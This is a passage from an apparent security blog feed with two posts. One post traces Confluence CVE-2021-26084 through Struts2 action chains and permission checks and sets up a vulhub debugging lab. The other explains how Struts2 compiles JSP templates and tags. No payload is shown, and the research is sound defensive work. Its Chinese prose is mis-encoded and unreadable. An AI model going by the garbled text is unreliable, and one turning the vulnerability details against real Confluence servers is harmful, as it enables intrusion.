start="5"><li>pagenotpermitted result</li></ol><p>pagenotpermitted result å¯¹åº”ActionChainResult</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;pagenotpermitted&quot;</span> <span class="attr">type</span>=<span class="string">&quot;chain&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;actionName&quot;</span>&gt;</span>pagenotpermitted<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="6"><li>PageNotPermittedAction</li></ol><p>ActionChainResult ä¼šæ‰§è¡Œ pagenotpermittedçš„actionï¼Œä¹Ÿå³PageNotPermittedAction</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;pagenotpermitted&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atlassian.confluence.pages.actions.PageNotPermittedAction&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;velocity&quot;</span>&gt;</span>/pages/pagenotpermitted.vm<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;login&quot;</span> <span class="attr">type</span>=<span class="string">&quot;redirect&quot;</span>&gt;</span>$&#123;loginUrl&#125;<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;noEditPermission&quot;</span> <span class="attr">type</span>=<span class="string">&quot;redirect&quot;</span>&gt;</span>$&#123;noPageEditPermissionRedirectUrl&#125;<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;noSpaceEditPermission&quot;</span> <span class="attr">type</span>=<span class="string">&quot;redirect&quot;</span>&gt;</span>$&#123;noSpaceEditPermissionRedirectUrl&#125;<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;cancel&quot;</span> <span class="attr">type</span>=<span class="string">&quot;redirect&quot;</span>&gt;</span>$&#123;targetUrlPath&#125;<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä¹‹åå°±è¿›å…¥äº†pagenotpermitted action çš„æµç¨‹</p><ol start="7"><li>validatingStack</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;pages&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;default&quot;</span> <span class="attr">namespace</span>=<span class="string">&quot;/pages&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default-interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;validatingStack&quot;</span>/&gt;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;pagenotpermitted&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atlassian.confluence.pages.actions.PageNotPermittedAction&quot;</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å¯¹åº”çš„interceptors ä¸ºvalidatingStack</p><p>ä¹‹åçš„æµç¨‹ä¸ä¹‹å‰ç±»ä¼¼ï¼Œè¿™é‡Œä¸èµ˜è¿°äº†</p><ol start="8"><li>PageNotPermittedAction</li></ol><p>æ‰§è¡Œå®Œinterceptorsï¼Œè¿”å›result login</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PermittedMethods(&#123;HttpMethod.ANY_METHOD&#125;)</span></span><br><span class="line"><span class="meta">@XsrfProtectionExcluded</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span> targetObjectIsDraft = (Boolean)<span class="keyword">this</span>.getTargetObject().map(ContentEntityObject::isDraft).orElse(<span class="keyword">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.getAuthenticatedUser() == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;login&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br></pre></td></tr></table></figure><p>è¿›è¡Œredirect</p><ol start="9"><li>RedirectResult</li></ol><p>RedirectResult è¿›è¡Œè·³è½¬å“åº”</p><h4 id="4-1-2-æƒé™éªŒè¯"><a href="#4-1-2-æƒé™éªŒè¯" class="headerlink" title="4.1.2 æƒé™éªŒè¯"></a>4.1.2 æƒé™éªŒè¯</h4><p>ä¸ç™»å½•ç›¸ä¼¼ï¼ŒåŒæ ·æ˜¯åœ¨PageAwareInterceptor ä¸­è¿›è¡Œæƒé™éªŒè¯ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">isPermitted:<span class="number">17</span>, CreatePageEntryAction (com.atlassian.confluence.pages.actions)</span><br><span class="line">configure:<span class="number">141</span>, PageAwareHelper (com.atlassian.confluence.impl.pages.actions)</span><br><span class="line">intercept:<span class="number">29</span>, PageAwareInterceptor (com.atlassian.confluence.pages.actions)</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-244.png" alt="upload successful"></p><p>è°ƒç”¨CreatePageEntryAction#isPermitted è¿›è¡Œæƒé™éªŒè¯</p><p>åç»­è¿˜æ¶‰åŠåˆ°</p><ul><li>DefaultPermissionManager</li><li>DefaultSpacePermissionManager</li></ul><p>ä¸åšè¿‡å¤šèµ˜è¿°</p><h3 id="4-2-å¦‚ä½•å†™å‡ºæœ‰é—®é¢˜çš„Velocity"><a href="#4-2-å¦‚ä½•å†™å‡ºæœ‰é—®é¢˜çš„Velocity" class="headerlink" title="4.2 å¦‚ä½•å†™å‡ºæœ‰é—®é¢˜çš„Velocity"></a>4.2 å¦‚ä½•å†™å‡ºæœ‰é—®é¢˜çš„Velocity</h3><p>å…¶å®å½’æ ¹ç»“åº•ï¼Œæ˜¯Struct2 velocityæ¨¡æ¿äºŒæ¬¡æ³¨å…¥çš„é—®é¢˜ï¼Œåœ¨Struct2 çš„å†å²æ¼æ´ä¸­ä¹Ÿæœ‰å‡ºç°è¿‡ï¼Œç•™å¾…ä»¥åStruct2 ç³»åˆ—å†æ€»ç»“å§ã€‚</p><h2 id="0x05-å°ç»“"><a href="#0x05-å°ç»“" class="headerlink" title="0x05 å°ç»“"></a>0x05 å°ç»“</h2><p>æœ¬æ–‡è·Ÿè¸ªå¤ç°äº†Confluence CVE-2021-26084 è¿™ä¸ªVelocityæ¨¡æ¿äºŒæ¬¡æ³¨å…¥æ¼æ´ï¼Œå‘ç°è¿™æ˜¯Struct2 çš„é€šç”¨é—®é¢˜ã€‚åŒ…æ‹¬ä¹‹å‰åˆ†æè¿‡çš„Confluence CVE-2022-26134 OGNL è¿™ä¸€æ¼æ´ï¼Œå…¶å®ä¹Ÿæ˜¯å’ŒStruct2 ç‰¹æ€§æœ‰å…³ã€‚</p><p>Struct2 æ¡†æ¶è™½ç„¶ä¸å†æµè¡Œï¼Œä½†å…¶ä¸€ç³»åˆ—çš„æ¼æ´åŠä¿®å¤ã€ç»•è¿‡è¿˜æ˜¯å¾ˆç»å…¸ï¼Œä¸€äº›å†å²çš„äº§å“ä¹Ÿå¯èƒ½è¿˜å­˜åœ¨ç±»ä¼¼çš„é—®é¢˜ï¼Œè™½ç„¶æ˜¯ä¸ªéš¾å•ƒçš„çŸ¥è¯†ç‚¹ï¼Œä½†æ˜¯å€ŸConfluence è¿™ä¸¤ä¸ªæ¼æ´çš„å¥‘æœºï¼Œä¹Ÿå‡†å¤‡å¤ç°åˆ†æStruct2 çš„å†å²æ¼æ´ä¸€ç•ªã€‚</p><p>å…¶ä»–çš„æ€è€ƒç‚¹</p><ol><li>Confluenceçš„ç™»å½•/è§’è‰² é‰´æƒæ€ä¹ˆåšçš„ï¼Œè¿™å—è¿˜æ²¡åˆ†æï¼Œæœ‰æ²¡æœ‰å¯æ“ä½œç©ºé—´</li><li>pocæœ‰unicodeç¼–ç ï¼ŒåŸå› åœ¨ognlä¸€èŠ‚å·²ç»æåˆ°è¿‡</li></ol><h2 id="0x06-å‚è€ƒ"><a href="#0x06-å‚è€ƒ" class="headerlink" title="0x06 å‚è€ƒ"></a>0x06 å‚è€ƒ</h2><ul><li>[1] <a href="https://www.anquanke.com/post/id/253398">CVE-2021-26084ï¼šConfluence Webwork Ognlè¡¨è¾¾å¼æ³¨å…¥æ¼æ´åˆ†æ (by:Lotso)</a></li><li>[2] <a href="https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2021-26084">Confluence Server Webwork Pre-Auth OGNL Injection (CVE-2021-26084) (by:Vulhub)</a></li><li>[3] <a href="https://jira.atlassian.com/browse/CONFSERVER-67940">Confluence Server Webwork OGNL injection - CVE-2021-26084</a></li><li>[4] <a href="https://github.com/h3v0x/CVE-2021-26084_Confluence">https://github.com/h3v0x/CVE-2021-26084_Confluence</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;Confluence CVE-2021-26084 æ˜¯å‰å°èƒ½å¤Ÿè§¦å‘çš„RCEï¼ŒCVSS9.8ï¼Œå±å®³ä¸å°ã€‚æ¼æ´åŸå› æ˜¯å› ä¸ºVelocity å†™å¾—æœ‰é—®é¢˜å¯¼è‡´å¯ä»¥Ognlæ³¨å…¥ï¼Œè¿™ç§æ¨¡æ¿é—®é¢˜å¯¼è‡´çš„æ¼æ´æŒºå°‘è§ï¼Œä½†æ˜¯å¾ˆé€‚ç”¨ï¼Œå€¼å¾—åˆ†æã€‚&lt;/p&gt;
&lt;h2 id=&quot;0x01-ç¯å¢ƒæ­å»º&quot;&gt;&lt;a href=&quot;#0x01-ç¯å¢ƒæ­å»º&quot; class=&quot;headerlink&quot; title=&quot;0x01 ç¯å¢ƒæ­å»º&quot;&gt;&lt;/a&gt;0x01 ç¯å¢ƒæ­å»º&lt;/h2&gt;&lt;p&gt;PğŸ®çš„Vulhub æœ‰é•œåƒï¼Œå‚è€ƒã€2ã€‘ï¼ŒåŒæ ·è°ƒè¯•æ¥å£æ²¡æœ‰å¼€å‡ºæ¥ï¼Œå¯ä»¥å‚è€ƒä¹‹å‰çš„ã€ŠConfluence CVE-2022-26134 OGNL åˆ†æã€‹ä¸€æ–‡æ­å»ºç¯å¢ƒã€‚&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;æ–°å»ºDockerfile&lt;/p&gt;
&lt;figure class=&quot;highlight dockerfile&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;FROM&lt;/span&gt; vulhub/confluence:&lt;span class=&quot;number&quot;&gt;7.4&lt;/span&gt;.&lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;RUN&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; sed &lt;span class=&quot;string&quot;&gt;&amp;quot;67 iCATALINA_OPTS=\&amp;quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005 \$\&amp;#123;CATALINA_OPTS\&amp;#125;\&amp;quot;&amp;quot;&lt;/span&gt; -i /opt/atlassian/confluence/bin/setenv.sh&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;æ›´æ–°docker-compose.yml&lt;/p&gt;
&lt;figure class=&quot;highlight yaml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;build:&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;ports:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;bullet&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;8090:8090&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;bullet&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;5005:5005&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="Javaå®‰å…¨" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="æ¼æ´åˆ†æ" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Confluence" scheme="http://m0d9.me/tags/Confluence/"/>
    
    <category term="OGNL" scheme="http://m0d9.me/tags/OGNL/"/>
    
    <category term="Struts2" scheme="http://m0d9.me/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>Struts2ç³»åˆ—äºŒï¼šJSP/Velocityæ¨¡æ¿</title>
    <link href="http://m0d9.me/2022/07/13/Struts2%E7%B3%BB%E5%88%97%E4%BA%8C%EF%BC%9AVelocity%20%E6%A8%A1%E6%9D%BF/"/>
    <id>http://m0d9.me/2022/07/13/Struts2%E7%B3%BB%E5%88%97%E4%BA%8C%EF%BC%9AVelocity%20%E6%A8%A1%E6%9D%BF/</id>
    <published>2022-07-13T09:56:00.000Z</published>
    <updated>2022-09-19T07:55:58.552Z</updated>
    
    <content type="html"><![CDATA[<p>æ¨¡æ¿å¼•æ“æ³¨å…¥ä¹Ÿç®—æ˜¯é€šç”¨çš„æ¼æ´ç±»å‹äº†ï¼Œä¸è®ºæ˜¯python/javaï¼Œå‡ºç°è¿‡çš„cveä¾‹å­ä¹Ÿä¸å°‘ã€‚JSP/FreeMarker/Velocity ä½œä¸ºStruts2 çš„é»˜è®¤æ¨¡æ¿å¼•æ“ï¼Œåˆ†æåˆ†æå…¶å®ç°åŸç†ï¼Œä¸ºä»¥åçš„æ¼æ´åˆ†æä½œé“ºå«ã€‚</p><h2 id="0x01-èƒŒæ™¯çŸ¥è¯†"><a href="#0x01-èƒŒæ™¯çŸ¥è¯†" class="headerlink" title="0x01 èƒŒæ™¯çŸ¥è¯†"></a>0x01 èƒŒæ™¯çŸ¥è¯†</h2><h3 id="Struts2-Tag"><a href="#Struts2-Tag" class="headerlink" title="Struts2 Tag"></a>Struts2 Tag</h3><p>Tagæ˜¯struts æ¨¡æ¿å…ƒç´ çš„åŸºç¡€å•ä½ã€‚å»ºè®®å…ˆé˜…è¯»å‚è€ƒã€6ã€‘ä¸­ã€ŠTag Developers Guideã€‹ã€‚</p><p>Tag æœ‰ä»¥ä¸‹å‡ ç±»</p><ul><li>é€šç”¨tag<ul><li>æ§åˆ¶æµ tagï¼Œ ä¾‹å¦‚ ifã€else</li><li>æ•°æ®tagï¼Œ ä¾‹å¦‚includeã€setã€url</li></ul></li><li>UI tagï¼Œä¾‹å¦‚ fromã€textã€div<ul><li>Form tagï¼Œä¾‹å¦‚ checkboxã€checkboxã€head</li><li>éForm tagï¼Œä¾‹å¦‚actonerrorã€actionmessage</li></ul></li></ul><p>æ¨¡æ¿çš„é€»è¾‘æ˜¯å¦‚ä½•å®ç°çš„å‘¢ï¼Ÿ</p><a id="more"></a><h2 id="0x02-JSP"><a href="#0x02-JSP" class="headerlink" title="0x02 JSP"></a>0x02 JSP</h2><h3 id="2-1-JSP-Demo"><a href="#2-1-JSP-Demo" class="headerlink" title="2.1 JSP Demo"></a>2.1 JSP Demo</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%<span class="meta">@taglib</span> prefix=<span class="string">&quot;s&quot;</span> uri=<span class="string">&quot;/struts-tags&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;S2-001 Demo&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;h2&gt;S2-001 Demo&lt;/h2&gt;</span><br><span class="line">  &lt;s:form action=<span class="string">&quot;login&quot;</span>&gt;</span><br><span class="line">    &lt;s:textfield name=<span class="string">&quot;username&quot;</span> label=<span class="string">&quot;username&quot;</span> /&gt;</span><br><span class="line">    &lt;s:textfield name=<span class="string">&quot;password&quot;</span> label=<span class="string">&quot;password&quot;</span> /&gt;</span><br><span class="line">    &lt;s:submit&gt;&lt;/s:submit&gt;</span><br><span class="line">  &lt;/s:form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="2-2-åŸç†è§£æ"><a href="#2-2-åŸç†è§£æ" class="headerlink" title="2.2 åŸç†è§£æ"></a>2.2 åŸç†è§£æ</h3><h4 id="2-2-1-ç¼–è¯‘"><a href="#2-2-1-ç¼–è¯‘" class="headerlink" title="2.2.1 ç¼–è¯‘"></a>2.2.1 ç¼–è¯‘</h4><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œjsp è¿è¡Œæ—¶ä¼šè¢«ç¼–è¯‘æˆclassã€‚ç»†èŠ‚å¦‚ä½•</p><ul><li>ä½•æ—¶è¿›è¡Œçš„ç¼–è¯‘ï¼Ÿ</li><li>å¦‚ä½•è¿›è¡Œçš„ç¼–è¯‘ï¼Ÿ</li></ul><p>é€šå¸¸æƒ…å†µï¼Œæ˜¯åœ¨ç¬¬ä¸€æ¬¡è¯·æ±‚çš„æ—¶å€™ï¼Œjsp é¢„ç¼–è¯‘æˆjavaä»£ç ï¼Œåœ¨ç¼–è¯‘æˆjavaå­—èŠ‚ç ï¼Œä¹Ÿå³classæ–‡ä»¶ï¼Œç”±jspå¼•æ“å®ç°ï¼Œç›®å½•åœ¨CATALINA_BASE ç›®å½•ä¸‹ã€‚<br>å…·ä½“æ˜¯é€šè¿‡JDTCompilerï¼Œè¿™é‡Œä¸ä¸æ·±å…¥ç ”ç©¶ã€‚</p><p>ä¸Šæ–‡çš„ä¸­Demo æœ€ç»ˆç¼–è¯‘æˆçš„class ä»£ç æˆªå–å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">index_jsp</span> <span class="keyword">extends</span> <span class="title">HttpJspBase</span> <span class="keyword">implements</span> <span class="title">JspSourceDependent</span>, <span class="title">JspSourceImports</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">_jspService</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">...</span><br><span class="line">        <span class="keyword">if</span> (!<span class="string">&quot;GET&quot;</span>.equals(_jspx_method) &amp;&amp; !<span class="string">&quot;POST&quot;</span>.equals(_jspx_method) &amp;&amp; !<span class="string">&quot;HEAD&quot;</span>.equals(_jspx_method) &amp;&amp; !DispatcherType.ERROR.equals(request.getDispatcherType())) &#123;</span><br><span class="line">...</span><br><span class="line">                response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">...</span><br><span class="line">                out.write(<span class="string">&quot;    &lt;title&gt;S2-001 Demo&lt;/title&gt;\n&quot;</span>);</span><br><span class="line">...</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>._jspx_meth_s_005fform_005f0(pageContext)) &#123;</span><br><span class="line">...</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">_jspx_meth_s_005fform_005f0</span><span class="params">(PageContext _jspx_page_context)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">...</span><br><span class="line">            _jspx_th_s_005fform_005f0.setAction(<span class="string">&quot;login&quot;</span>);</span><br><span class="line">...</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">this</span>._jspx_meth_s_005ftextfield_005f0(_jspx_th_s_005fform_005f0, _jspx_page_context)) &#123;</span><br><span class="line">...</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">this</span>._jspx_meth_s_005ftextfield_005f1(_jspx_th_s_005fform_005f0, _jspx_page_context)) &#123;</span><br><span class="line">...</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">_jspx_meth_s_005ftextfield_005f0</span><span class="params">(JspTag _jspx_th_s_005fform_005f0, PageContext _jspx_page_context)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">...</span><br><span class="line">        TextFieldTag _jspx_th_s_005ftextfield_005f0 = (TextFieldTag)<span class="keyword">this</span>._005fjspx_005ftagPool_005fs_005ftextfield_0026_005fname_005flabel_005fnobody.get(TextFieldTag.class);</span><br><span class="line">...</span><br><span class="line">            _jspx_th_s_005ftextfield_005f0.setName(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">            _jspx_th_s_005ftextfield_005f0.setLabel(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">            _jspx_th_s_005ftextfield_005f0.doStartTag();</span><br><span class="line">            <span class="keyword">if</span> (_jspx_th_s_005ftextfield_005f0.doEndTag() == <span class="number">5</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">...</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">_jspx_meth_s_005ftextfield_005f1</span><span class="params">(JspTag _jspx_th_s_005fform_005f0, PageContext _jspx_page_context)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">...</span><br><span class="line">            _jspx_th_s_005ftextfield_005f1.setName(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">            _jspx_th_s_005ftextfield_005f1.setLabel(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">            _jspx_th_s_005ftextfield_005f1.doStartTag();</span><br><span class="line">            <span class="keyword">if</span> (_jspx_th_s_005ftextfield_005f1.doEndTag() == <span class="number">5</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><h4 id="2-2-2-Tag-å®ç°"><a href="#2-2-2-Tag-å®ç°" class="headerlink" title="2.2.2 Tag å®ç°"></a>2.2.2 Tag å®ç°</h4><p>ä»¥_jspx_meth_s_005ftextfield_005f0 ä¸ºä¾‹ï¼Œæœ€ç»ˆæ˜¯é€šè¿‡TextFieldTag class å®ç°çš„</p><ul><li>setxxx()ï¼šåˆå§‹åŒ–ï¼Œè®¾ç½®ä¸€äº›å‚æ•°</li><li>doStartTag()ï¼šè·å–ä¸€äº›ç»„ä»¶ä¿¡æ¯å’Œå±æ€§èµ‹å€¼ï¼Œæ€»ä¹‹æ˜¯äº›åˆå§‹åŒ–çš„å·¥ä½œ</li><li>doEndTag()ï¼šåœ¨æ ‡ç­¾è§£æç»“æŸåéœ€è¦åšçš„äº‹ï¼Œå¦‚è°ƒç”¨ç»„ä»¶çš„ end() æ–¹æ³•</li></ul><p><img src="/images/pasted-250.png" alt="upload successful"></p><p>ç±»ä¼¼çš„Tag è¿˜æœ‰å¾ˆå¤šï¼Œå¦‚ä¸Šé¢ä¸€èŠ‚ä¸­æåˆ°çš„</p><p><img src="/images/pasted-251.png" alt="upload successful"></p><h4 id="ComponentTagSupport"><a href="#ComponentTagSupport" class="headerlink" title="ComponentTagSupport"></a>ComponentTagSupport</h4><ul><li>BodyTagSupport æ˜¯servlet Tag åŸºç¡€ç±»</li><li>StrutsBodyTagSupport æ˜¯struts Tag åŸºç¡€ç±»ï¼Œæœ‰å‡ ä¸ªç›´æ¥å­ç±»ï¼ŒComponentTagSupport/ iterators</li><li>ComponentTagSupportï¼Œå…¶ä¸­å‡ ä¹æ‰€æœ‰çš„struts tagç±»éƒ½ç»§æ‰¿ComponentTagSupport</li></ul><p>ComponentTagSupport å®ç°äº†doStartTagã€doEndTag æ¥å£</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Component component;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">doStartTag</span><span class="params">()</span> <span class="keyword">throws</span> JspException </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.component = <span class="keyword">this</span>.getBean(<span class="keyword">this</span>.getStack(), (HttpServletRequest)<span class="keyword">this</span>.pageContext.getRequest(), (HttpServletResponse)<span class="keyword">this</span>.pageContext.getResponse());</span><br><span class="line">    <span class="keyword">this</span>.populateParams();</span><br><span class="line">    <span class="keyword">boolean</span> evalBody = <span class="keyword">this</span>.component.start(<span class="keyword">this</span>.pageContext.getOut());</span><br><span class="line">    <span class="keyword">if</span> (evalBody) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.component.usesBody() ? <span class="number">2</span> : <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">doEndTag</span><span class="params">()</span> <span class="keyword">throws</span> JspException </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.component.end(<span class="keyword">this</span>.pageContext.getOut(), <span 